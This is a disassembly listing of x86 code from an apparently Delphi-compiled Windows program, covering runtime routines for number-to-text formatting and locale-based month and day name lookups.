sub_412FDC	proc near		; CODE XREF: sub_413DEC+34p
					; sub_413EA8+41p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	ecx, [ebp+arg_0]
		xchg	eax, ecx
		xchg	edx, ecx
		call	sub_412FF0
		pop	ebp
		retn	4
sub_412FDC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_412FF0	proc near		; CODE XREF: sub_412FDC+Ap

var_1008	= byte ptr -1008h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFF004h
		push	eax
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		mov	[ebp+var_8], ecx
		mov	[ebp+var_4], edx
		mov	esi, eax
		mov	ebx, 1000h
		mov	eax, [ebp+var_4]
		call	sub_403C24
		cmp	eax, 0C00h
		jge	short loc_413041
		mov	eax, [ebp+var_4]
		call	sub_403C24
		push	eax
		mov	eax, [ebp+var_8]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		mov	ecx, [ebp+var_4]
		lea	eax, [ebp+var_1008]
		mov	edx, 0FFFh
		call	sub_412C24
		jmp	short loc_41304D
; ---------------------------------------------------------------------------

loc_413041:				; CODE XREF: sub_412FF0+29j
		mov	eax, [ebp+var_4]
		call	sub_403C24
		mov	ebx, eax
		mov	eax, ebx

loc_41304D:				; CODE XREF: sub_412FF0+4Fj
		mov	edx, ebx
		dec	edx
		cmp	eax, edx
		jl	short loc_413097
		jmp	short loc_413086
; ---------------------------------------------------------------------------

loc_413056:				; CODE XREF: sub_412FF0+9Bj
		add	ebx, ebx
		mov	eax, esi
		call	sub_403994
		mov	eax, esi
		mov	edx, ebx
		call	sub_403F0C
		mov	eax, [ebp+var_4]
		call	sub_403C24
		push	eax
		mov	eax, [ebp+var_8]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		mov	ecx, [ebp+var_4]
		mov	edx, ebx
		dec	edx
		mov	eax, [esi]
		call	sub_412C24

loc_413086:				; CODE XREF: sub_412FF0+64j
		mov	edx, ebx
		dec	edx
		cmp	eax, edx
		jge	short loc_413056
		mov	edx, esi
		xchg	eax, edx
		call	sub_403F0C
		jmp	short loc_4130A5
; ---------------------------------------------------------------------------

loc_413097:				; CODE XREF: sub_412FF0+62j
		lea	edx, [ebp+var_1008]
		mov	ecx, esi
		xchg	eax, ecx
		call	sub_403A84

loc_4130A5:				; CODE XREF: sub_412FF0+A5j
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_412FF0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4130B0	proc near		; CODE XREF: sub_4131FD+8Dp
		push	esi
		xor	esi, esi
		stosb
		or	bl, bl
		jnz	short loc_4130BC
		xor	edx, edx
		jmp	short loc_4130C6
; ---------------------------------------------------------------------------

loc_4130BC:				; CODE XREF: sub_4130B0+6j
		or	edx, edx
		jge	short loc_4130C6
		mov	al, 2Dh
		neg	edx
		jmp	short loc_4130CC
; ---------------------------------------------------------------------------

loc_4130C6:				; CODE XREF: sub_4130B0+Aj
					; sub_4130B0+Ej
		or	ah, ah
		jz	short loc_4130CD
		mov	al, ah

loc_4130CC:				; CODE XREF: sub_4130B0+14j
		stosb

loc_4130CD:				; CODE XREF: sub_4130B0+18j
		xchg	eax, edx
		push	eax
		mov	ebx, esp

loc_4130D1:				; CODE XREF: sub_4130B0+32j
					; sub_4130B0+36j
		xor	edx, edx
		div	ds:dword_416B7C[esi]
		add	dl, 30h
		mov	[ebx], dl
		inc	ebx
		dec	ecx
		or	eax, eax
		jnz	short loc_4130D1
		or	ecx, ecx
		jg	short loc_4130D1

loc_4130E8:				; CODE XREF: sub_4130B0+3Ej
		dec	ebx
		mov	al, [ebx]
		stosb
		cmp	ebx, esp
		jnz	short loc_4130E8
		pop	eax
		pop	esi
		retn
sub_4130B0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4130F4	proc near		; CODE XREF: sub_412D4E+222p

var_2C		= word ptr -2Ch
var_29		= byte ptr -29h
var_14		= dword	ptr -14h
var_E		= byte ptr -0Eh
var_D		= byte ptr -0Dh
var_C		= dword	ptr -0Ch
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h

; FUNCTION CHUNK AT 004133C1 SIZE 00000006 BYTES

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFD4h
		push	edi
		push	esi
		push	ebx
		mov	[ebp+var_4], eax
		mov	al, ds:byte_4176FF
		mov	[ebp+var_5], al
		mov	al, ds:byte_4176FE
		mov	[ebp+var_6], al
		mov	eax, ds:dword_4176F8
		mov	[ebp+var_C], eax
		mov	al, ds:byte_4176FC
		mov	[ebp+var_D], al
		mov	al, ds:byte_4176FD
		mov	[ebp+var_E], al
		mov	[ebp+var_14], 0
		mov	eax, 13h
		cmp	cl, 0
		jnz	short loc_413150
		mov	eax, [ebp+arg_4]
		cmp	eax, 2
		jge	short loc_413146
		mov	eax, 2

loc_413146:				; CODE XREF: sub_4130F4+4Bj
		cmp	eax, 12h
		jle	short loc_413150
		mov	eax, 12h

loc_413150:				; CODE XREF: sub_4130F4+43j
					; sub_4130F4+55j
		mov	[ebp+arg_4], eax
		push	eax
		mov	eax, 270Fh
		cmp	[ebp+arg_8], 2
		jb	short loc_413162
		mov	eax, [ebp+arg_0]

loc_413162:				; CODE XREF: sub_4130F4+69j
		push	eax
		lea	eax, [ebp+var_2C]
		call	sub_4133C8
		mov	edi, [ebp+var_4]
		movzx	eax, [ebp+var_2C]
		sub	eax, 7FFFh
		cmp	eax, 2
		jnb	short loc_413196
		mov	ecx, eax
		call	sub_4131F3
		lea	esi, loc_4131E4[ecx+ecx*2]
		add	esi, [ebp+var_14]
		mov	ecx, 3
		rep movsb
		jmp	short loc_4131C3
; ---------------------------------------------------------------------------

loc_413196:				; CODE XREF: sub_4130F4+86j
		lea	esi, [ebp+var_29]
		movzx	ebx, [ebp+arg_8]
		cmp	bl, 1
		jz	short loc_4131B2
		cmp	bl, 4
		ja	short loc_4131B0
		movsx	eax, [ebp+var_2C]
		cmp	eax, [ebp+arg_4]
		jle	short loc_4131B2

loc_4131B0:				; CODE XREF: sub_4130F4+B1j
		mov	bl, 0

loc_4131B2:				; CODE XREF: sub_4130F4+ACj
					; sub_4130F4+BAj
		lea	ebx, off_4131D0[ebx*4]
		add	ebx, [ebp+var_14]
		mov	ebx, [ebx]
		add	ebx, [ebp+var_14]
		call	ebx

loc_4131C3:				; CODE XREF: sub_4130F4+A0j
		mov	eax, edi
		sub	eax, [ebp+var_4]
		pop	ebx
		pop	esi
		pop	edi
		jmp	loc_4133C1
sub_4130F4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
off_4131D0	dd offset sub_4131FD	; DATA XREF: sub_4130F4:loc_4131B2o
		dd offset loc_413259
		dd offset sub_413290
		dd offset sub_413290
		dd offset sub_4132FA
; ---------------------------------------------------------------------------

loc_4131E4:				; DATA XREF: sub_4130F4+8Fo
		dec	ecx
		dec	esi
		inc	esi
		dec	esi
		inc	ecx
		dec	esi

; =============== S U B	R O U T	I N E =======================================


sub_4131EA	proc near		; CODE XREF: sub_4131FD+61p
					; sub_4131FD:loc_41326Cp ...
		lodsb
		or	al, al
		jnz	short locret_4131F2
		mov	al, 30h
		dec	esi

locret_4131F2:				; CODE XREF: sub_4131EA+3j
		retn
sub_4131EA	endp


; =============== S U B	R O U T	I N E =======================================


sub_4131F3	proc near		; CODE XREF: sub_4130F4+8Ap
					; sub_4131FDp ...
		cmp	byte ptr [ebp-2Ah], 0
		jz	short locret_4131FC
		mov	al, 2Dh
		stosb

locret_4131FC:				; CODE XREF: sub_4131F3+4j
		retn
sub_4131F3	endp


; =============== S U B	R O U T	I N E =======================================


sub_4131FD	proc near		; DATA XREF: CODE:off_4131D0o
		call	sub_4131F3
		movsx	ecx, word ptr [ebp-2Ch]
		xor	edx, edx
		cmp	ecx, [ebp+0Ch]
		jg	short loc_41322A
		cmp	ecx, 0FFFFFFFDh
		jl	short loc_41322A
		or	ecx, ecx
		jg	short loc_413230
		mov	al, 30h
		stosb
		cmp	byte ptr [esi],	0
		jz	short locret_413258
		mov	al, [ebp-5]
		stosb
		neg	ecx
		mov	al, 30h
		rep stosb
		jmp	short loc_413244
; ---------------------------------------------------------------------------

loc_41322A:				; CODE XREF: sub_4131FD+Ej
					; sub_4131FD+13j
		mov	ecx, 1
		inc	edx

loc_413230:				; CODE XREF: sub_4131FD+17j
					; sub_4131FD+39j
		lodsb
		or	al, al
		jz	short loc_41324C
		stosb
		loop	loc_413230
		lodsb
		or	al, al
		jz	short loc_413250
		mov	ah, al
		mov	al, [ebp-5]
		stosw

loc_413244:				; CODE XREF: sub_4131FD+2Bj
					; sub_4131FD+4Dj
		lodsb
		or	al, al
		jz	short loc_413250
		stosb
		jmp	short loc_413244
; ---------------------------------------------------------------------------

loc_41324C:				; CODE XREF: sub_4131FD+36j
		mov	al, 30h
		rep stosb

loc_413250:				; CODE XREF: sub_4131FD+3Ej
					; sub_4131FD+4Aj
		or	edx, edx
		jz	short locret_413258
		xor	eax, eax
		jmp	short loc_413276
; ---------------------------------------------------------------------------

locret_413258:				; CODE XREF: sub_4131FD+1Fj
					; sub_4131FD+55j
		retn
; ---------------------------------------------------------------------------

loc_413259:				; DATA XREF: CODE:004131D4o
		call	sub_4131F3
		call	sub_4131EA
		mov	ah, [ebp-5]
		stosw
		mov	ecx, [ebp+0Ch]
		dec	ecx

loc_41326C:				; CODE XREF: sub_4131FD+75j
		call	sub_4131EA
		stosb
		loop	loc_41326C
		mov	ah, 2Bh

loc_413276:				; CODE XREF: sub_4131FD+59j
		mov	ecx, [ebp+8]
		cmp	ecx, 4
		jbe	short loc_413280
		xor	ecx, ecx

loc_413280:				; CODE XREF: sub_4131FD+7Fj
		mov	al, 45h
		mov	bl, [ebp-29h]
		movsx	edx, word ptr [ebp-2Ch]
		dec	edx
		call	sub_4130B0
		retn
sub_4131FD	endp


; =============== S U B	R O U T	I N E =======================================


sub_413290	proc near		; DATA XREF: CODE:004131D8o
					; CODE:004131DCo
		call	sub_4131F3

loc_413295:				; CODE XREF: sub_4132FA:loc_413343p
		mov	edx, [ebp+8]
		cmp	edx, 12h
		jb	short loc_4132A2
		mov	edx, 12h

loc_4132A2:				; CODE XREF: sub_413290+Bj
		movsx	ecx, word ptr [ebp-2Ch]
		or	ecx, ecx
		jg	short loc_4132AF
		mov	al, 30h
		stosb
		jmp	short loc_4132D9
; ---------------------------------------------------------------------------

loc_4132AF:				; CODE XREF: sub_413290+18j
		xor	ebx, ebx
		cmp	byte ptr [ebp+10h], 2
		jz	short loc_4132C1
		mov	eax, ecx
		dec	eax
		mov	bl, 3
		div	bl
		mov	bl, ah
		inc	ebx

loc_4132C1:				; CODE XREF: sub_413290+25j
					; sub_413290+3Bj ...
		call	sub_4131EA
		stosb
		dec	ecx
		jz	short loc_4132D9
		dec	ebx
		jnz	short loc_4132C1
		mov	al, [ebp-6]
		test	al, al
		jz	short loc_4132C1
		stosb
		mov	bl, 3
		jmp	short loc_4132C1
; ---------------------------------------------------------------------------

loc_4132D9:				; CODE XREF: sub_413290+1Dj
					; sub_413290+38j
		or	edx, edx
		jz	short locret_4132F9
		mov	al, [ebp-5]
		test	al, al
		jz	short loc_4132E5
		stosb

loc_4132E5:				; CODE XREF: sub_413290+52j
		jecxz	short loc_4132F0
		mov	al, 30h

loc_4132E9:				; CODE XREF: sub_413290+5Ej
		stosb
		dec	edx
		jz	short locret_4132F9
		inc	ecx
		jnz	short loc_4132E9

loc_4132F0:				; CODE XREF: sub_413290:loc_4132E5j
					; sub_413290+67j
		call	sub_4131EA
		stosb
		dec	edx
		jnz	short loc_4132F0

locret_4132F9:				; CODE XREF: sub_413290+4Bj
					; sub_413290+5Bj
		retn
sub_413290	endp


; =============== S U B	R O U T	I N E =======================================


sub_4132FA	proc near		; DATA XREF: CODE:004131E0o
		xor	ebx, ebx
		mov	bl, [ebp-0Dh]
		mov	ecx, 3
		cmp	byte ptr [ebp-2Ah], 0
		jz	short loc_413312
		mov	bl, [ebp-0Eh]
		mov	ecx, 40Fh

loc_413312:				; CODE XREF: sub_4132FA+Ej
		cmp	bl, cl
		jbe	short loc_413318
		mov	bl, cl

loc_413318:				; CODE XREF: sub_4132FA+1Aj
		add	bl, ch
		lea	ebx, sub_41335D[ebx+ebx*4]
		add	ebx, [ebp-14h]
		mov	ecx, 5

loc_413329:				; CODE XREF: sub_4132FA+51j
		mov	al, [ebx]
		cmp	al, 40h
		jz	short locret_41334D
		push	ecx
		push	ebx
		cmp	al, 24h
		jz	short loc_41333C
		cmp	al, 2Ah
		jz	short loc_413343
		stosb
		jmp	short loc_413348
; ---------------------------------------------------------------------------

loc_41333C:				; CODE XREF: sub_4132FA+39j
		call	sub_41334E
		jmp	short loc_413348
; ---------------------------------------------------------------------------

loc_413343:				; CODE XREF: sub_4132FA+3Dj
		call	loc_413295

loc_413348:				; CODE XREF: sub_4132FA+40j
					; sub_4132FA+47j
		pop	ebx
		pop	ecx
		inc	ebx
		loop	loc_413329

locret_41334D:				; CODE XREF: sub_4132FA+33j
		retn
sub_4132FA	endp


; =============== S U B	R O U T	I N E =======================================


sub_41334E	proc near		; CODE XREF: sub_4132FA:loc_41333Cp
		push	esi
		mov	esi, [ebp-0Ch]
		test	esi, esi
		jz	short loc_41335B
		mov	ecx, [esi-4]
		rep movsb

loc_41335B:				; CODE XREF: sub_41334E+6j
		pop	esi
		retn
sub_41334E	endp


; =============== S U B	R O U T	I N E =======================================


sub_41335D	proc near		; DATA XREF: sub_4132FA+20o
		and	al, 2Ah
		inc	eax
		inc	eax
		inc	eax
		sub	ah, [eax+eax*2]
		inc	eax
		inc	eax
		and	al, 20h
		sub	al, [eax+40h]
		sub	ah, [eax]
		and	al, 40h
		inc	eax
		sub	[edx+ebp], ah
		sub	[eax+2Dh], eax
		and	al, 2Ah
		inc	eax
		inc	eax
		and	al, 2Dh
		sub	al, [eax+40h]
		and	al, 2Ah
		sub	eax, 2A284040h
		and	al, 29h
		inc	eax
		sub	eax, 4040242Ah
		sub	ch, ds:2A404024h
		and	al, 2Dh
		inc	eax
		inc	eax
		sub	eax, 4024202Ah
		sub	eax, 402A2024h
		sub	ah, [eax]
		and	al, 2Dh
		inc	eax
		and	al, 20h
		sub	ch, ds:2D202440h
		sub	al, [eax+2Ah]
		sub	eax, 28402420h
		and	al, 20h
		sub	ch, [ecx]
		sub	[edx], ch
		and	[ecx+ebp], ah
sub_41335D	endp ; sp-analysis failed

; START	OF FUNCTION CHUNK FOR sub_4130F4

loc_4133C1:				; CODE XREF: sub_4130F4+D7j
		mov	esp, ebp
		pop	ebp
		retn	0Ch
; END OF FUNCTION CHUNK	FOR sub_4130F4
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4133C8	proc near		; CODE XREF: sub_4130F4+72p

var_4		= dword	ptr -4

; FUNCTION CHUNK AT 004135EB SIZE 00000009 BYTES

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE0h
		push	edi
		push	esi
		push	ebx
		mov	ebx, eax
		mov	esi, edx
		mov	[ebp+var_4], 0
		cmp	cl, 0
		jz	short loc_4133EB
		call	sub_413517
		jmp	loc_4135EB
; ---------------------------------------------------------------------------

loc_4133EB:				; CODE XREF: sub_4133C8+17j
		call	sub_4133F5
		jmp	loc_4135EB
sub_4133C8	endp


; =============== S U B	R O U T	I N E =======================================


sub_4133F5	proc near		; CODE XREF: sub_4133C8:loc_4133EBp
		mov	ax, [esi+8]
		mov	edx, eax
		and	eax, 7FFFh
		jz	short loc_413420
		cmp	eax, 7FFFh
		jnz	short loc_41342B
		test	word ptr [esi+6], 8000h
		jz	short loc_413422
		cmp	dword ptr [esi], 0
		jnz	short loc_41341F
		cmp	dword ptr [esi+4], 80000000h
		jz	short loc_413422

loc_41341F:				; CODE XREF: sub_4133F5+1Fj
		inc	eax

loc_413420:				; CODE XREF: sub_4133F5+Bj
					; sub_4133F5+AFj
		xor	edx, edx

loc_413422:				; CODE XREF: sub_4133F5+1Aj
					; sub_4133F5+28j
		mov	byte ptr [ebx+3], 0
		jmp	loc_4134F8
; ---------------------------------------------------------------------------

loc_41342B:				; CODE XREF: sub_4133F5+12j
		fld	tbyte ptr [esi]
		sub	eax, 3FFFh
		imul	eax, 4D10h
		sar	eax, 10h
		inc	eax
		mov	[ebp-8], eax
		mov	eax, 12h
		sub	eax, [ebp-8]
		fabs
		push	ebx
		mov	ebx, [ebp-4]
		call	sub_4028C8
		pop	ebx
		frndint
		mov	edi, [ebp-4]
		fld	ds:tbyte_416B70[edi]
		fcomp	st(1)
		fstsw	word ptr [ebp-0Ah]
		db	66h
		wait
		test	word ptr [ebp-0Ah], 4100h
		jz	short loc_413476
		fidiv	ds:dword_416B7C[edi]
		inc	dword ptr [ebp-8]

loc_413476:				; CODE XREF: sub_4133F5+76j
		fbstp	tbyte ptr [ebp-18h]
		lea	edi, [ebx+3]
		mov	edx, 9
		wait

loc_413482:				; CODE XREF: sub_4133F5+A0j
		mov	al, [edx+ebp-19h]
		mov	ah, al
		shr	al, 4
		and	ah, 0Fh
		add	ax, 3030h
		stosw
		dec	edx
		jnz	short loc_413482
		xor	al, al
		stosb
		mov	edi, [ebp-8]
		add	edi, [ebp+8]
		jns	short loc_4134A9
		xor	eax, eax
		jmp	loc_413420
; ---------------------------------------------------------------------------

loc_4134A9:				; CODE XREF: sub_4133F5+ABj
		cmp	edi, [ebp+0Ch]
		jb	short loc_4134B1
		mov	edi, [ebp+0Ch]

loc_4134B1:				; CODE XREF: sub_4133F5+B7j
		cmp	edi, 12h
		jnb	short loc_4134DD
		cmp	byte ptr [ebx+edi+3], 35h
		jb	short loc_4134E2

loc_4134BD:				; CODE XREF: sub_4133F5+D9j
		mov	byte ptr [ebx+edi+3], 0
		dec	edi
		js	short loc_4134D2
		inc	byte ptr [ebx+edi+3]
		cmp	byte ptr [ebx+edi+3], 39h
		ja	short loc_4134BD
		jmp	short loc_4134F1
; ---------------------------------------------------------------------------

loc_4134D2:				; CODE XREF: sub_4133F5+CEj
		mov	word ptr [ebx+3], 31h
		inc	dword ptr [ebp-8]
		jmp	short loc_4134F1
; ---------------------------------------------------------------------------

loc_4134DD:				; CODE XREF: sub_4133F5+BFj
		mov	edi, 12h

loc_4134E2:				; CODE XREF: sub_4133F5+C6j
					; sub_4133F5+FAj
		mov	byte ptr [ebx+edi+3], 0
		dec	edi
		js	short loc_413503
		cmp	byte ptr [ebx+edi+3], 30h
		jz	short loc_4134E2

loc_4134F1:				; CODE XREF: sub_4133F5+DBj
					; sub_4133F5+E6j
		mov	dx, [esi+8]

loc_4134F5:				; CODE XREF: sub_4133F5+110j
		mov	eax, [ebp-8]

loc_4134F8:				; CODE XREF: sub_4133F5+31j
		shr	dx, 0Fh
		mov	[ebx], ax
		mov	[ebx+2], dl
		retn
; ---------------------------------------------------------------------------

loc_413503:				; CODE XREF: sub_4133F5+F3j
					; DATA XREF: sub_413517+60r
		xor	edx, edx
		jmp	short loc_4134F5
sub_4133F5	endp

; ---------------------------------------------------------------------------
		db 0Ah
		dd 64000000h, 0E8000000h, 10000003h
		db 27h,	2 dup(0)

; =============== S U B	R O U T	I N E =======================================


sub_413517	proc near		; CODE XREF: sub_4133C8+19p
		mov	eax, [esi]
		mov	edx, [esi+4]
		mov	ecx, eax
		or	ecx, edx
		jz	loc_4135DD
		or	edx, edx
		jns	short loc_413531
		neg	edx
		neg	eax
		sbb	edx, 0

loc_413531:				; CODE XREF: sub_413517+11j
		xor	ecx, ecx
		mov	edi, [ebp+8]
		or	edi, edi
		jge	short loc_41353C
		xor	edi, edi

loc_41353C:				; CODE XREF: sub_413517+21j
		cmp	edi, 4
		jl	short loc_413560
		mov	edi, 4

loc_413546:				; CODE XREF: sub_413517+3Bj
		inc	ecx
		sub	eax, 0A7640000h
		sbb	edx, 0DE0B6B3h
		jnb	short loc_413546
		dec	ecx
		add	eax, 0A7640000h
		adc	edx, 0DE0B6B3h

loc_413560:				; CODE XREF: sub_413517+28j
		mov	[ebp-20h], eax
		mov	[ebp-1Ch], edx
		fild	qword ptr [ebp-20h]
		mov	edx, edi
		mov	eax, 4
		sub	eax, edx
		jz	short loc_41357E
		mov	edi, [ebp-4]
		fidiv	dword ptr loc_413503[edi+eax*4]

loc_41357E:				; CODE XREF: sub_413517+5Bj
		fbstp	tbyte ptr [ebp-18h]
		lea	edi, [ebx+3]
		wait
		or	ecx, ecx
		jnz	short loc_4135A4
		mov	ecx, 9

loc_41358E:				; CODE XREF: sub_413517+89j
		mov	al, [ecx+ebp-19h]
		mov	ah, al
		shr	al, 4
		jnz	short loc_4135B7
		mov	al, ah
		and	al, 0Fh
		jnz	short loc_4135BE
		dec	ecx
		jnz	short loc_41358E
		jmp	short loc_4135DD
; ---------------------------------------------------------------------------

loc_4135A4:				; CODE XREF: sub_413517+70j
		mov	al, cl
		add	al, 30h
		stosb
		mov	ecx, 9

loc_4135AE:				; CODE XREF: sub_413517+ABj
		mov	al, [ecx+ebp-19h]
		mov	ah, al
		shr	al, 4

loc_4135B7:				; CODE XREF: sub_413517+80j
		add	al, 30h
		stosb
		mov	al, ah
		and	al, 0Fh

loc_4135BE:				; CODE XREF: sub_413517+86j
		add	al, 30h
		stosb
		dec	ecx
		jnz	short loc_4135AE
		mov	eax, edi
		lea	ecx, [ebx+edx+3]
		sub	eax, ecx

loc_4135CC:				; CODE XREF: sub_413517+BCj
		mov	byte ptr [edi],	0
		dec	edi
		cmp	byte ptr [edi],	30h
		jz	short loc_4135CC
		mov	edx, [esi+4]
		shr	edx, 1Fh
		jmp	short loc_4135E4
; ---------------------------------------------------------------------------

loc_4135DD:				; CODE XREF: sub_413517+9j
					; sub_413517+8Bj
		xor	eax, eax
		xor	edx, edx
		mov	[ebx+3], al

loc_4135E4:				; CODE XREF: sub_413517+C4j
		mov	[ebx], ax
		mov	[ebx+2], dl
		retn
sub_413517	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_4133C8

loc_4135EB:				; CODE XREF: sub_4133C8+1Ej
					; sub_4133C8+28j
		pop	ebx
		pop	esi
		pop	edi
		mov	esp, ebp
		pop	ebp
		retn	8
; END OF FUNCTION CHUNK	FOR sub_4133C8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4135F4	proc near		; CODE XREF: sub_413668+1Cp
					; sub_41387C+27p ...

LCData		= byte ptr -100h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFF00h
		push	ebx
		push	esi
		mov	esi, ecx
		mov	ebx, [ebp+arg_0]
		push	100h		; cchData
		lea	ecx, [ebp+LCData]
		push	ecx		; lpLCData
		push	edx		; LCType
		push	eax		; Locale
		call	GetLocaleInfoA_0
		test	eax, eax
		jle	short loc_41362D
		mov	ecx, eax
		dec	ecx
		lea	edx, [ebp+LCData]
		mov	eax, ebx
		call	sub_403A84
		jmp	short loc_413636
; ---------------------------------------------------------------------------

loc_41362D:				; CODE XREF: sub_4135F4+25j
		mov	eax, ebx
		mov	edx, esi
		call	sub_4039E8

loc_413636:				; CODE XREF: sub_4135F4+37j
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_4135F4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_413640	proc near		; CODE XREF: sub_4149B8+ADp
					; sub_4149B8+C0p ...

LCData		= byte ptr -10h

		push	ebx
		push	esi
		push	edi
		push	ecx
		mov	ebx, ecx
		mov	esi, edx
		mov	edi, eax
		push	2		; cchData
		lea	eax, [esp+14h+LCData]
		push	eax		; lpLCData
		push	esi		; LCType
		push	edi		; Locale
		call	GetLocaleInfoA_0
		test	eax, eax
		jle	short loc_413661
		mov	al, [esp+10h+LCData]
		jmp	short loc_413663
; ---------------------------------------------------------------------------

loc_413661:				; CODE XREF: sub_413640+1Aj
		mov	eax, ebx

loc_413663:				; CODE XREF: sub_413640+1Fj
		pop	edx
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_413640	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_413668	proc near		; CODE XREF: sub_4136A4+46p
					; sub_4136A4+69p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], ecx
		mov	edi, edx
		mov	esi, eax
		mov	ebx, [ebp+arg_0]
		push	ebx
		mov	eax, [ebp+arg_8]
		mov	eax, [eax-4]
		xor	ecx, ecx
		mov	edx, esi
		call	sub_4135F4
		cmp	dword ptr [ebx], 0
		jnz	short loc_41369B
		mov	eax, [ebp+var_4]
		mov	eax, [eax+edi*4]
		mov	edx, ebx
		call	sub_404D54

loc_41369B:				; CODE XREF: sub_413668+24j
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	8
sub_413668	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4136A4	proc near		; CODE XREF: sub_4149B8+23p

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		push	ebp
		push	offset loc_4137B7
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	GetThreadLocale_0
		mov	[ebp+var_4], eax
		mov	ebx, 1
		mov	esi, offset dword_417720
		mov	edi, offset dword_417750

loc_4136D7:				; CODE XREF: sub_4136A4+83j
		push	ebp
		push	0Bh
		lea	eax, [ebp+var_C]
		push	eax
		mov	ecx, offset off_416B80
		mov	edx, ebx
		dec	edx
		lea	eax, [ebx+44h]
		dec	eax
		call	sub_413668
		pop	ecx
		mov	edx, [ebp+var_C]
		mov	eax, esi
		call	sub_4039E8
		push	ebp
		push	0Bh
		lea	eax, [ebp+var_10]
		push	eax
		mov	ecx, offset off_416BB0
		mov	edx, ebx
		dec	edx
		lea	eax, [ebx+38h]
		dec	eax
		call	sub_413668
		pop	ecx
		mov	edx, [ebp+var_10]
		mov	eax, edi
		call	sub_4039E8
		inc	ebx
		add	edi, 4
		add	esi, 4
		cmp	ebx, 0Dh
		jnz	short loc_4136D7
		mov	ebx, 1
		mov	esi, offset dword_417780
		mov	edi, offset dword_41779C

loc_413738:				; CODE XREF: sub_4136A4+F6j
		lea	eax, [ebx+5]
		mov	ecx, 7
		cdq
		idiv	ecx
		mov	[ebp+var_8], edx
		push	ebp
		push	6
		lea	eax, [ebp+var_14]
		push	eax
		mov	ecx, offset off_416BE0
		mov	edx, ebx
		dec	edx
		mov	eax, [ebp+var_8]
		add	eax, 31h
		call	sub_413668
		pop	ecx
		mov	edx, [ebp+var_14]
		mov	eax, esi
		call	sub_4039E8
		push	ebp
		push	6
		lea	eax, [ebp+var_18]
		push	eax
		mov	ecx, offset off_416BFC
		mov	edx, ebx
		dec	edx
		mov	eax, [ebp+var_8]
		add	eax, 2Ah
		call	sub_413668
		pop	ecx
		mov	edx, [ebp+var_18]
		mov	eax, edi
		call	sub_4039E8
		inc	ebx
		add	edi, 4
		add	esi, 4
		cmp	ebx, 8
		jnz	short loc_413738
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4137BE

loc_4137A9:				; CODE XREF: sub_4136A4+118j
		lea	eax, [ebp+var_18]
		mov	edx, 4
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_4137B7:				; DATA XREF: sub_4136A4+11o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4137A9
; ---------------------------------------------------------------------------

loc_4137BE:				; CODE XREF: sub_4136A4+112j
					; DATA XREF: sub_4136A4+100o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4136A4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall CalInfoEnumProc(LPSTR)
CalInfoEnumProc	proc near		; DATA XREF: sub_41387C+4Eo

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		xor	esi, esi
		mov	ebx, 1
		jmp	short loc_4137DC
; ---------------------------------------------------------------------------

loc_4137D6:				; CODE XREF: CalInfoEnumProc+1Cj
		cmp	ebx, 7
		jz	short loc_4137FA
		inc	ebx

loc_4137DC:				; CODE XREF: CalInfoEnumProc+Cj
		cmp	ds:dword_4177C4[ebx*4],	0
		jnz	short loc_4137D6
		lea	eax, dword_4177C4[ebx*4]
		mov	edx, [ebp+arg_0]
		call	sub_403B8C
		mov	esi, 1

loc_4137FA:				; CODE XREF: CalInfoEnumProc+11j
		mov	eax, esi
		pop	esi
		pop	ebx
		pop	ebp
		retn	4
CalInfoEnumProc	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall sub_413804(LPSTR)
